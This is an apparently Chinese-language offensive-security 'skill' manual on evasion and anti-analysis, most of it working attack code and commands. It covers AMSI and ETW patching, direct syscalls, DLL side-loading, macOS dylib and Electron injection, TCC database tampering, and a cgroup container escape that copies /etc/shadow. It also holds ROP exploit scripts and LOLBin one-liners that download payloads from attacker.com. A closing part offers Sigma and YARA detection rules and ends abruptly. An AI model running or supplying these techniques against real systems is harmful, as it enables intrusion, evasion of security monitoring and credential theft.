---
name: evasion-techniques
description: >
  Complete manual for evasion and anti-analysis techniques across platforms. Covers AV/EDR evasion on Windows/macOS/Linux, code obfuscation and deobfuscation (JavaScript/PowerShell/binary), sandbox detection and escape, anti-debugging/anti-reversing countermeasures, binary protection bypass (ASLR/DEP/stack canaries), constant-time cryptographic analysis, and IPv6 exploitation for lateral movement evasion.
domain: cybersecurity
subdomain: offensive-security
tags: [evasion, av-bypass, edr-evasion, obfuscation, deobfuscation, anti-debugging, anti-reversing, sandbox-evasion, binary-protection, aslr, dep, constant-time, ipv6]
version: 2.0.0
---

# 规避与反分析技术 — 完整攻防手册

## 适用场景

- 绕过 Windows Defender / AMSI / ETW 实现 AV/EDR 规避
- macOS TCC 绕过、进程注入与安全框架规避
- Linux 安全模块（SELinux/AppArmor）绕过
- 代码混淆与反混淆（JavaScript/PowerShell/二进制）
- 沙箱检测、沙箱逃逸与反沙箱技术
- 反调试/反逆向工程对抗
- 二进制保护机制绕过（DEP/ASLR/Stack Canary/PIE）
- 常数时间侧信道分析与加密实现验证
- IPv6 协议利用实现横向移动规避

**不适用场景**：C2 基础设施搭建 — 参见 `c2-infrastructure`；权限提升 — 参见 `privilege-escalation`；恶意软件静态分析 — 参见 `malware-analysis-static`。

## 前置条件

- 操作系统 internals（Windows PE/Registry、macOS Mach-O/TCC、Linux ELF）
- 汇编语言基础（x86/x64/ARM64）
- 网络协议（TCP/IPv6）
- 基础逆向工程经验（IDA/Ghidra/x64dbg）
- Python/PowerShell/Bash 脚本能力

---

## Part A：攻击方法论

### 1. 识别与探测

#### 1.1 安全产品指纹识别

```powershell
# === Windows AV/EDR 探测 ===

# 查询已安装 AV 产品
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct |
  Select displayName, productState

# 检测 EDR 驱动（常见驱动文件名）
$edrDrivers = @(
  "CSAgent", "CSFalconService",           # CrowdStrike
  "MBAMProtection", "MBAMService",         # Malwarebytes
  "SepMasterService", "ccSvcHst",          # Symantec
  "MsSense", "SenseIR",                    # Microsoft Defender for Endpoint
  "TmCCSF", "PccNT",                       # Trend Micro
  "SAVOnAccess", "SophosMTR"               # Sophos
)
foreach ($driver in $edrDrivers) {
  $svc = Get-Service -Name $driver -ErrorAction SilentlyContinue
  if ($svc) { Write-Host "[!] Detected: $driver - Status: $($svc.Status)" }
}

# 检查 AMSI 状态
[System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")
$amsi = [AMSI]
Write-Host "AMSI Initialized: $($amsi::InitFailed -eq $false)"
```

```bash
# === Linux 安全模块探测 ===

# 检查 SELinux 状态
getenforce 2>/dev/null || echo "SELinux not installed"
sestatus 2>/dev/null

# 检查 AppArmor 状态
aa-status 2>/dev/null || echo "AppArmor not running"
cat /proc/self/attr/current 2>/dev/null

# 检查加载的安全模块
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
ls /sys/kernel/security/ 2>/dev/null

# 检测审计框架
auditctl -s 2>/dev/null
cat /etc/audit/auditd.conf 2>/dev/null | head -5
```

```bash
# === macOS 安全机制探测 ===

# 检查 SIP (System Integrity Protection)
csrutil status

# 检查 TCC 数据库
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT service, client, allowed FROM access;" 2>/dev/null

# 检查 Gatekeeper
spctl --status

# 检查 AMFI (Apple Mobile File Integrity)
csrutil status | grep -i amfi

# 检测已安装的安全工具
ps aux | grep -iE "crowdstrike|sentinel|carbon|cylance| defender"
launchctl list | grep -iE "security|protect|sentinel"
```

#### 1.2 沙箱/虚拟环境检测

```python
#!/usr/bin/env python3
"""沙箱环境检测脚本 — 用于红队评估"""
import os, sys, platform, subprocess, time, uuid

checks = {"vm": [], "sandbox": [], "analysis": []}

# --- 虚拟机检测 ---
# MAC 地址前缀（OUI）
vm_macs = {
    "00:0C:29": "VMware", "00:50:56": "VMware",
    "00:1C:42": "Parallels", "08:00:27": "VirtualBox",
    "00:16:3E": "Xen", "52:54:00": "KVM/QEMU",
    "00:15:5D": "Hyper-V", "F0:1F:AF": "VirtualPC",
}
mac = uuid.getnode()
mac_str = ":".join(f"{(mac >> (8*i)) & 0xFF:02X}" for i in range(5,-1,-1))
oui = mac_str[:8].upper()
if oui in vm_macs:
    checks["vm"].append(f"VM MAC: {oui} ({vm_macs[oui]})")

# VM 特征文件/注册表
vm_indicators = [
    "/proc/hypervisor", "/sys/class/dmi/id/product_name",
    "C:\\Windows\\System32\\drivers\\vmmouse.sys",
]
for path in vm_indicators:
    if os.path.exists(path):
        checks["vm"].append(f"VM indicator file: {path}")

# CPU 核心数（沙箱通常 <= 2）
if os.cpu_count() and os.cpu_count() <= 2:
    checks["sandbox"].append(f"Low CPU count: {os.cpu_count()}")

# 物理内存（沙箱通常 < 4GB）
if sys.platform == "win32":
    import ctypes
    kernel32 = ctypes.windll.kernel32
    MEM = ctypes.c_ulonglong()
    kernel32.GlobalMemoryStatusEx(ctypes.byref(MEM))
    if MEM.value < 4 * 1024**3:
        checks["sandbox"].append(f"Low RAM: {MEM.value // (1024**3)} GB")

# --- 行为分析检测 ---
# 时间加速检测
t1 = time.time()
time.sleep(3)
t2 = time.time()
if (t2 - t1) < 2.5:
    checks["analysis"].append("Time acceleration detected")

# 用户交互检测
if sys.platform == "win32":
    LASTINPUT = ctypes.c_ulong()
    kernel32.GetTickCount()
    # 检查空闲时间
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_ulong), ("dwTime", ctypes.c_ulong)]
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
    idle_ms = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
    if idle_ms > 300000:  # > 5 min idle
        checks["sandbox"].append(f"Long idle time: {idle_ms//1000}s")

# 结果汇总
for category, findings in checks.items():
    if findings:
        print(f"\n[!] {category.upper()} indicators:")
        for f in findings:
            print(f"    - {f}")
    else:
        print(f"[+] No {category} indicators found")
```

### 2. 利用与攻击

#### 2.1 Windows AV/EDR 规避

**AMSI 绕过技术：**

```powershell
# === AMSI 绕过 — 内存修补 ===
# 技术：修补 AmsiScanBuffer 返回 AMSI_RESULT_CLEAN

# 方法 1：直接内存修补
$a = [System.Reflection.Assembly]::LoadWithPartialName("System.Reflection")
$patch = [byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$amsi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
  (Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h, string n);' -Name K32 -PassThru)::GetProcAddress(
    [System.Diagnostics.Process]::GetCurrentProcess().MainModule.BaseAddress, "amsi.dll"),
  [Func[IntPtr]]
).Invoke()
# 注意：以上为概念性演示；实际操作需要获取 AmsiScanBuffer 地址

# 方法 2：PowerShell Reflection 修补（更可靠）
[Byte[]]$buffer = [System.Text.Encoding]::Unicode.GetBytes("AmsiScanBuffer")
$hModule = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
  [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation").GetType(
    "System.Management.Automation.AmsiUtils"
  ).Assembly.GetModules()[0]
)
# 查找并修补 AmsiScanBuffer
```

```c
// === ETW 修补 — 禁用事件追踪 ===
// 修补 EtwEventWrite 使其直接返回
#include <windows.h>

BOOL PatchETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return FALSE;

    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)pEtwEventWrite = 0xC3;  // ret
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);

    return TRUE;
}
```

**直接系统调用（Direct Syscalls）：**

```x86asm
; === Direct Syscall — NtCreateThreadEx ===
; 绕过 EDR 用户态 hook（ntdll.dll inline hook）
; x64 Assembly (MASM)

NtCreateThreadEx PROC
    mov r10, rcx                    ; Win64 调用约定
    mov eax, 0C2h                   ; NtCreateThreadEx 系统调用号 (Win10/11)
                                    ; 注意：syscall 号因 Windows 版本而异
    syscall                         ; 直接内核调用，不经过 ntdll
    ret
NtCreateThreadEx ENDP

; 完整的 syscall 号映射表（部分）:
; NtAllocateVirtualMemory  = 0x18
; NtProtectVirtualMemory   = 0x50
; NtWriteVirtualMemory     = 0x3A
; NtCreateThreadEx          = 0xC2
; NtOpenProcess             = 0x26
; NtOpenThread              = 0x53
```

**DLL 侧加载规避：**

```xml
<!-- DLL Side-Loading — 利用合法 EXE 加载恶意 DLL -->
<!-- 伪装为合法程序，规避路径/签名白名单 -->

<!-- 示例：利用 Microsoft SigCheck.exe 侧加载 -->
<!-- 文件布局：
  target\
    sigcheck.exe      (合法签名 Microsoft 二进制)
    version.dll       (恶意 DLL，劫持导入)
-->

<!-- 使用 SharpDllProxy 自动生成代理 DLL -->
<!-- SharpDllProxy -s sigcheck.exe -d version.dll -->
```

```bash
# DLL 侧加载工具链
# 1. 识别可侧加载的二进制
python3 FindObjects.py -d target_directory -o sideload_candidates.json

# 2. 生成代理 DLL（转发原始函数 + 加载恶意代码）
# 使用 SharpDllProxy
SharpDllProxy.exe --target legitimate.exe --dll version.dll

# 3. 使用 Hollows_Hunter 检测被注入的进程
HollowsHunter.exe /dir C:\target /out results
```

#### 2.2 macOS 安全规避

**进程注入技术：**

```bash
# === macOS 进程注入 ===

# 1. DYLD_INSERT_LIBRARIES 注入（类似 LD_PRELOAD）
# 创建恶意 dylib
cat > inject.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void inject() {
    system("/bin/bash -c 'echo PWNED > /tmp/injected'");
}
EOF
clang -shared -o inject.dylib inject.c -arch arm64

# 注入到目标进程
DYLD_INSERT_LIBRARIES=./inject.dylib /Applications/Safari.app/Contents/MacOS/Safari

# 2. task_for_pid 基于 Mach API 的注入（需要 SIP 关闭或平台二进制）
cat > mach_inject.m << 'OBJC'
#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <mach-o/dyld.h>

kern_return_t mach_inject(pid_t target_pid, const char *dylib_path) {
    task_t target_task;
    kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &target_task);
    if (kr != KERN_SUCCESS) {
        NSLog(@"task_for_pid failed: %s", mach_error_string(kr));
        return kr;
    }
    // 分配远程内存并写入 dylib 路径
    vm_address_t remote_addr = 0;
    vm_allocate(target_task, &remote_addr, 4096, TRUE);
    vm_write(target_task, remote_addr, (vm_offset_t)dylib_path, strlen(dylib_path)+1);

    // 通过 thread_create 设置远程线程执行 dlopen
    // ... (省略 thread state 设置细节)
    return KERN_SUCCESS;
}
OBJC

# 3. Electron 应用注入（修改 asar 包）
# 解包应用
npx asar extract /Applications/Target.app/Contents/Resources/app.asar /tmp/app_extracted
# 修改 JS 代码
echo "require('child_process').exec('id > /tmp/pwned')" >> /tmp/app_extracted/src/main.js
# 重新打包
npx asar pack /tmp/app_extracted /Applications/Target.app/Contents/Resources/app.asar
```

**TCC 综合利用：**

```bash
# === TCC (Transparency, Consent, and Control) 绕过 ===

# 1. TCC 数据库直接修改（需要 Full Disk Access 或 root）
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
  "INSERT OR REPLACE INTO access VALUES('kTCCServiceScreenCapture','com.your.app',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1);"

# 2. 利用有 TCC 权限的应用（如 Xcode）
# 通过 Xcode 的调试器附加到目标进程
lldb -p $(pgrep -x "TargetApp")
# 调试器继承 TCC 权限

# 3. 利用 osascript 社工绕过
osascript -e 'tell application "System Events" to get name of every process'

# 4. 利用 *.tccservice 文件
# 某些旧版 macOS 的 TCC 权限检查存在竞争条件
python3 tcc_bypass.py --service kTCCServiceMicrophone --target-app com.your.app
```

#### 2.3 Linux 安全规避

```bash
# === Linux 安全模块绕过 ===

# 1. SELinux 策略探测与利用
# 获取当前安全上下文
id -Z
ls -Z /path/to/target

# 查找宽松的 SELinux 布尔值
getsebool -a | grep -E "on$"
# 常见可利用的布尔值:
getsebool httpd_can_network_connect     # Apache 外连
getsebool nis_enabled                   # NIS 服务放行
getsebool allow_execstack               # 允许可执行栈

# 利用宽松域
# 如果 httpd_t 可以 execmem，则可以注入 shellcode

# 2. AppArmor 配置错误利用
# 检查进程的 AppArmor 配置文件
cat /proc/self/attr/current

# 查找未受保护的 SUID 二进制
find / -perm -4000 2>/dev/null | while read f; do
  profile=$(cat /proc/self/attr/current 2>/dev/null)
  if [ "$profile" = "unconfined" ]; then
    echo "[!] Unconfined SUID: $f"
  fi
done

# 3. Namespace/Container 逃逸基础
# 检查当前 namespace
ls -la /proc/self/ns/
cat /proc/1/cgroup | head -3

# 利用 cgroup release_agent (需要特权容器)
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w
echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > '"$host_path"'/output' >> /cmd
chmod a+x /cmd
sh -c "echo 0 > $d/w/cgroup.procs"
```

#### 2.4 二进制保护绕过

```bash
# === 二进制保护检查 ===

# 使用 checksec 检查保护机制
# 安装: pip install pwntools 或 git clone checksec
checksec --file=/path/to/binary

# 输出示例:
# RELRO      STACK CANARY  NX         PIE        RPATH      RUNPATH    Symbols
# Full RELRO Canary found   NX enabled  PIE enabled  No RPATH   No RUNPATH  Stripped

# === DEP/NX 绕过 — ret2libc ===
# 当 NX 启用，无法直接执行栈上 shellcode
# 利用 libc 中的 system() + "/bin/sh"

# 使用 ROPgadget 查找 gadget
ROPgadget --binary /path/to/vuln --ropchain

# pwntools 自动构建 ROP chain
python3 << 'EOF'
from pwn import *

elf = ELF('./vuln_binary')
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])

# 如果无 system，使用 execve syscall
rop.call('execve', [next(elf.search(b'/bin/sh')), 0, 0])

print(rop.dump())
EOF

# === ASLR 绕过 ===
# 方法 1：信息泄露获取基址
# 通过格式化字符串漏洞泄露栈/堆地址
# 使用 GDB 验证
gdb -q ./vuln_binary
(gdb) run <<< "%p.%p.%p.%p.%p.%p.%p.%p"
# 第 N 个 %p 可能泄露 binary base 或 libc 地址

# 方法 2：partial overwrite（ASLR 只随机化高位）
# 低位 12 位不变，可以覆盖低 2 字节
# 需要 4096 次暴力猜测（2^12）

# 方法 3：ret2plt / ret2csu
# PLT 地址不受 ASLR 影响（Full RELRO 除外）

# === Stack Canary 绕过 ===
# 方法 1：泄露 canary 值
# 格式化字符串或越界读获取 canary
python3 << 'EOF'
from pwn import *
p = process('./vuln')
# 假设 canary 在栈偏移 11
p.sendline(b'%11$p')
canary = int(p.recvline(), 16)
log.info(f"Leaked canary: {hex(canary)}")
EOF

# 方法 2：逐字节爆破（fork 服务器，子进程崩溃不影响 canary）
# 每次 256 次尝试，8 字节 canary 最多 256*8 = 2048 次

# 方法 3：覆盖 __stack_chk_fail GOT（无 Full RELRO 时）
```

**ROP Chain 示例（x64）：**

```python
#!/usr/bin/env python3
"""ROP chain 构建 — 绕过 NX/DEP"""
from pwn import *

context.arch = 'amd64'
elf = ELF('./vuln_binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 第一步：泄露 libc 地址
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')          # 返回 main 重新触发漏洞

payload = b'A' * 72       # buffer + saved rbp
payload += bytes(rop)

p = process('./vuln_binary')
p.sendline(payload)
p.recvuntil(b'\n')
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")

# 第二步：system("/bin/sh")
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh'))])

payload2 = b'A' * 72
payload2 += bytes(rop2)
p.sendline(payload2)
p.interactive()
```

#### 2.5 IPv6 利用与规避

```bash
# === IPv6 规避利用 ===

# 1. NDP Spoofing — 篡改邻居发现协议
# 类似 IPv4 的 ARP 欺骗，但针对 IPv6
# 使用 THC-IPv6 工具包
apt install thc-ipv6

# 发现 IPv6 邻居
ip -6 neigh show
# 或被动探测
passive_discovery6 eth0

# MITM 攻击（类似 arp spoof）
parasite6 eth0
# 或指定目标
parasite6 -l -R eth0 fe80::target

# 2. SLAAC 攻击 — 流氓路由器通告
# 向网络发送伪造的 RA 消息
fake_router26 -A fe80::1 -L eth0

# 3. IPv6 隧道利用（规避 IPv4 防火墙）
# 建立 6to4 隧道绕过出口过滤
ip tunnel add tun6 mode sit remote <remote_ipv4> local <local_ipv4>
ip link set tun6 up
ip addr add 2001:db8::2/64 dev tun6
ip route add ::/0 dev tun6

# 4. IPv6 扩展头利用
# 使用路由扩展头绕过 ACL
# 某些防火墙不检查扩展头中的嵌套协议
scapy << 'EOF'
from scapy.all import *
# 构造带路由扩展头的 ICMPv6
pkt = IPv6(dst="fe80::1")/IPv6ExtHdrRouting(addresses=["fe80::2"])/ICMPv6EchoRequest()
send(pkt)
EOF

# 5. 邻居缓存溢出（DoS + 规避）
flood_router26 eth0
# 填满邻居缓存表，导致合法条目被驱逐
```

### 3. 工具使用

#### 3.1 代码混淆工具

```bash
# === PowerShell 混淆（红队） ===

# Invoke-Obfuscation 框架
Import-Module Invoke-Obfuscation.psd1
Invoke-Obfuscation

# 命令行批量混淆
Invoke-Obfuscation -ScriptBlock { whoami } -Command 'TOKEN\ALL\1'

# 混淆类型:
# TOKEN — 标记替换（变量名、字符串分割）
# STRING — 字符串混淆（编码、反转、拼接）
# ENCODING — 编码混淆（Base64、十六进制、八进制）
# COMPRESS — 压缩混淆
# LAUNCHER — 启动器混淆（powershell.exe 参数混淆）
# PS: Set-Obfuscation -ScriptBlock {IEX(NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING('http://x/p.ps1')} -Encoding 3

# === JavaScript 混淆 ===

# 使用 javascript-obfuscator
npm install -g javascript-obfuscator
javascript-obfuscator input.js --output output.js \
  --compact true \
  --control-flow-flattening true \
  --dead-code-injection true \
  --string-array true \
  --string-array-encoding 'rc4' \
  --self-defending true

# 使用 JShaman（商业级混淆）
# 在线工具: https://www.jshaman.com/

# === 二进制混淆 ===

# 使用 LLVM Obfuscator (OLLVM)
# 编译时混淆
git clone https://github.com/heroims/obfuscator
cd obfuscator
mkdir build && cd build
cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF ..
make -j$(nproc)

# 使用混淆编译
./bin/clang -mllvm -fla -mllvm -sub -mllvm -bcf target.c -o target_obfuscated
# -fla: 控制流平坦化
# -sub: 指令替换
# -bcf: 虚假控制流
```

#### 3.2 反混淆工具

```bash
# === PowerShell 反混淆 ===

# 使用 PSDecode
pip install psdecode
psdecode -f suspicious.ps1

# 使用 Revoke-Obfuscation（检测框架）
Import-Module Revoke-Obfuscation.psd1
# 分析脚本
Get-ObfuscatedContent -Path suspicious.ps1
# 检测混淆特征
Get-RvoScriptBlockAsterisk -ScriptBlock $obfuscated_code

# 手动反混淆常用模式
# 模式 1: IEX (New-Object Net.WebClient).DownloadString
# 搜索: IEX|Invoke-Expression|&"I`E`X"
# 解码: 替换 IEX 为 Write-Host 或 Out-File

# 模式 2: Base64 编码命令
# powershell -enc <base64>
echo "<base64>" | base64 -d
# 或 PowerShell:
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("<base64>"))

# 模式 3: 字符串分割拼接
# $env:cOmSPeC[23,18,20] => "mpi" => 组成命令
# 手动还原: 逐步替换变量和索引

# === JavaScript 反混淆 ===

# 使用 JSDetox（浏览器反混淆环境）
# 或使用 deobfuscator
npm install -g js-deobfuscator
js-deobfuscator input.js -o output_clean.js

# 使用 Synthesize（基于 AST 的反混淆）
# pip install synthesize

# 手动反混淆技巧：
# 1. 替换 eval() 为 console.log() 查看实际代码
# 2. 在浏览器开发者工具中设置 XHR 断点
# 3. 使用 Chrome DevTools 的 "Pretty Print" (格式化)
# 4. 解码常见编码：
node -e "console.log(decodeURIComponent('<encoded_str>'))"
node -e "console.log(Buffer.from('<base64>','base64').toString())"

# === Shellcode 提取与反汇编 ===
# 从二进制中提取 shellcode
python3 << 'EOF'
import re
with open('malware_sample', 'rb') as f:
    data = f.read()
# 查找常见 shellcode 模式
patterns = [
    b'\xfc\xe8\x89',        # msfvenom x86
    b'\xfc\x48\x83\xe4',    # msfvenom x64
    b'\xe8\x00\x00\x00\x00',# call $+5 (position-independent)
]
for pat in patterns:
    idx = data.find(pat)
    if idx != -1:
        print(f"[!] Shellcode pattern at offset {hex(idx)}: {pat.hex()}")
        # 提取 500 字节用于分析
        sc = data[idx:idx+500]
        with open(f'shellcode_{hex(idx)}.bin', 'wb') as out:
            out.write(sc)
EOF

# 使用 ndisasm 反汇编 shellcode
ndisasm -b 64 shellcode_0x1000.bin | head -50
# 或使用 objdump
objdump -D -b binary -m i386:x86-64 shellcode_0x1000.bin
```

### 4. 绕过技术

#### 4.1 反调试对抗

```c
// === 反调试技术目录 ===

// 1. IsDebuggerPresent — 最基础的反调试
if (IsDebuggerPresent()) {
    ExitProcess(0);  // 或执行误导代码
}

// 2. CheckRemoteDebuggerPresent
BOOL bDebugger = FALSE;
CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebugger);
if (bDebugger) { /* 反调试动作 */ }

// 3. NtQueryInformationProcess — 检测调试端口
typedef NTSTATUS(NTAPI* pNtQIP)(HANDLE, UINT, PVOID, ULONG, PULONG);
pNtQIP NtQIP = (pNtQIP)GetProcAddress(
    GetModuleHandleA("ntdll"), "NtQueryInformationProcess");
DWORD debugPort = 0;
NtQIP(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);
if (debugPort != 0) { /* 调试器存在 */ }

// 4. 时序检测（anti-debug timing）
DWORD t1 = GetTickCount();
Sleep(100);  // 调试器下单步会变慢
DWORD t2 = GetTickCount();
if ((t2 - t1) > 500) { /* 可能在调试 */ }

// 5. 硬件断点检测
CONTEXT ctx = {};
ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
GetThreadContext(GetCurrentThread(), &ctx);
if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
    /* 硬件断点存在 */
}

// 6. TLS Callback — 在 main 之前执行反调试
#pragma section(".CRT$XLY", execute, read)
__declspec(allocate(".CRT$XLY")) PIMAGE_TLS_CALLBACK tls_callback[] = {
    [](PVOID h, DWORD reason, PVOID) {
        if (reason == DLL_PROCESS_ATTACH && IsDebuggerPresent())
            ExitProcess(0);
    }
};
```

**反调试绕过（逆向工程师视角）：**

```bash
# 绕过 IsDebuggerPresent:
# x64dbg 命令
SetBreakPoint <address_of_IsDebuggerPresent_call>
# 修改返回值为 0

# 或使用 ScyllaHide 插件（自动绕过常见反调试）
# 安装到 x64dbg plugins 目录

# 绕过时序检测:
# 使用 x64dbg 的 "Trace" 功能而非单步
# 或在脚本中 patch Sleep 为即时返回

# macOS 反调试绕过:
# 使用 dylib 注入绕过 ptrace 限制
DYLD_INSERT_LIBRARIES=./anti_debug_bypass.dylib /path/to/app
```

#### 4.2 反沙箱与延迟执行

```powershell
# === 延迟执行技术 ===

# 1. Sleep 大值绕过沙箱超时
Start-Sleep -Seconds 300  # 5 分钟延迟

# 2. 复合条件延迟（增加沙箱模拟难度）
$startTime = Get-Date
while (($startTime.AddMinutes(5)) -gt (Get-Date)) {
    Start-Sleep -Seconds 1
    # 沙箱可能不会模拟完整 Sleep
}

# 3. 用户交互触发
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("Click OK to continue")
# 沙箱通常不会点击对话框

# 4. 系统活动检测
$minProcesses = 50
$processCount = (Get-Process).Count
if ($processCount -lt $minProcesses) {
    # 很可能是沙箱环境
    exit
}

# 5. 网络连通性真实检测
try {
    $dns = [System.Net.Dns]::GetHostAddresses("very-specific-subdomain.real-domain.com")
    if ($dns.Count -eq 0) { exit }
} catch { exit }
```

#### 4.3 LOLBin 滥用规避

```bash
# === Living Off The Land Binary 滥用 ===

# 1. certutil.exe — 下载/编码
certutil.exe -urlcache -split -f http://attacker.com/payload.bin C:\temp\p.bin
certutil.exe -decode C:\temp\encoded.txt C:\temp\decoded.exe

# 2. msiexec.exe — 远程执行
msiexec /quiet /i http://attacker.com/malicious.msi
msiexec /quiet /i \\server\share\payload.msi

# 3. mshta.exe — 执行 HTA/VBS
mshta.exe http://attacker.com/payload.hta
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd"":Close")

# 4. rundll32.exe — DLL 执行
rundll32.exe payload.dll,EntryPoint
rundll32.exe \\server\share\payload.dll,entry
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"

# 5. WMIC — 远程命令执行
wmic.exe /node:target /user:admin /password:pass process call create "cmd.exe /c whoami"

# 6. forfiles — 间接执行
forfiles /p c:\windows\system32 /m notepad.exe /c "cmd.exe /c payload.exe"

# 7. explorer.exe — 启动 payload
explorer.exe /root,"C:\temp\payload.exe"

# 8. syncappvpublishingserver.vbs — 执行 PowerShell
syncappvpublishingserver.vbs "n; $(payload_command)"
```

---

## Part B：检测与防御

### 5. 检测规则

#### 5.1 规避行为检测（Sigma 规则）

```yaml
# === AMSI 绕过检测 ===
title: AMSI Bypass via Memory Patching
id: amsi-bypass-001
status: stable
level: high
description: 检测通过修改 AmsiScanBuffer 实现的 AMSI 绕过
author: Security Team
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4656  # Handle requested
        ObjectName|contains: 'AmsiScanBuffer'
        DesiredAccess|contains: '0x38'  # WRITE access
    condition: selection
falsepositives:
    - 极少，安全产品通常不直接修改 AMSI
tags:
    - attack.defense_evasion
    - attack.t1562.001

---
# === Direct Syscall 检测 ===
title: Potential Direct Syscall Usage
id: syscall-001
status: experimental
level: medium
description: 检测绕过 ntdll.dll 直接执行系统调用的行为
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 10  # ProcessAccess
        CallTrace|contains:
            - 'unknown'
            - 'unbacked'
    filter_legitimate:
        SourceImage|endswith:
            - '\csrss.exe'
            - '\smss.exe'
            - '\wininit.exe'
    condition: selection and not filter_legitimate
tags:
    - attack.defense_evasion
    - attack.t1106

---
# === LOLBin 滥用检测 ===
title: Suspicious LOLBin Network Activity
id: lolbin-net-001
status: stable
level: medium
description: 检测 LOLBin 二进制的可疑网络活动
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 3  # Network connection
        Image|endswith:
            - '\certutil.exe'
            - '\mshta.exe'
            - '\msiexec.exe'
            - '\bitsadmin.exe'
            - '\rundll32.exe'
        Initiated: 'true'
    condition: selection
falsepositives:
    - 合法软件更新（msiexec、certutil）
tags:
    - attack.command_and_control
    - attack.t1105
```

#### 5.2 YARA 规则 — 混淆/加壳检测

```yaml
# === 混淆 PowerShell 检测 ===
rule Obfuscated_PowerShell {
    meta:
        description = "检测高度混淆的 PowerShell 脚本"
        author = "Security Team"
        severity = "high"
    strings:
        $s1 = "IEX" ascii nocase wide
        $s2 = "Invoke-Expression" ascii nocase wide
        $s3 = "New-Object Net.WebClient" ascii nocase wide
        $s4 = "[System.Convert]::FromBase64String" ascii wide
        $s5 = "GetObject" ascii wide
        // 字符串拼接特征
        $p1 = "'+'" wide
        $p2 = "`" wide
        // 编码特征
        $e1 = "-enc" ascii nocase
        $e2 = "-encodedcommand" ascii nocase
        $e3 = "FromBase64" ascii
    condition:
        (any of ($s*) and 2 of ($p*)) or
        (any of ($e*) and filesize < 50KB)
}

rule Packed_Executable {
    meta:
        description = "检测加壳/压缩的可执行文件"
        severity = "medium"
    strings:
        // UPX 特征
        $upx1 = "UPX0" ascii
        $upx2 = "UPX1" ascii
        // Themida/VMProtect 特征
        $themida = ".themida" ascii
        $vmp = ".vmp" ascii
        // 通用加壳特征
        $entropy_high = "PE"
    condition:
        any of ($upx*) or any of ($themida, $vmp) or
        (uint16(0) == 0x5A4D and pe.entropy > 7.0)
}

rule Anti_Debug_Techniques {
    meta:
        description = "检测包含反调试技术的二进制"
        severity = "low"
    strings:
        $api1 = "IsDebuggerPresent" ascii
        $api2 = "CheckRemoteDebuggerPresent" ascii
        $api3 = "NtQueryInformationProcess" ascii
        $api4 = "OutputDebugString" ascii
        $api5 = "ZwQuerySystemInformation" ascii
        $str1 = "rdtsc" ascii
        $str2 = "TLS callback" ascii wide
    condition:
        2 of ($api*) or any of ($str*)
}
```

#### 5.3 沙箱规避行为检测

```python
#!/usr/bin/env python3
"""检测文件中的反沙箱行为"""
import re, sys, json

SANDBOX_INDICATORS = {
    "vm_detection": [
        r"VMware|VirtualBox|QEMU|Xen|Hyper-V",
        r"vmmouse|vmware\s*tools|VBOX",
        r"(?i)HKEY.*\\SYSTEM\\CurrentControlSet\\Services\\.*vm",
    ],
    "timing_evasion": [
        r"Sleep\s*\(\s*\d{4,}\s*\)",          # Sleep > 1000ms
        r"GetTickCount|QueryPerformanceCounter",
        r"time\.sleep\s*\(\s*\d+\s*\)",
        r"SetTimer|WaitForSingleObject",
    ],
    "user_interaction": [
        r"GetCursorPos|GetLastInputInfo",
        r"FindWindow|EnumWindows",
        r"SystemParametersInfo",
        r"GetAsyncKeyState|GetKeyState",
    ],
    "system_fingerprint": [
        r"ProcessorId|NumberOfCores|TotalPhysicalMemory",
        r"MAC.*address|GetAdaptersInfo",
        r"GetComputerName|GetUserName",
        r"VolumeSerialNumber|DiskSize",
    ],
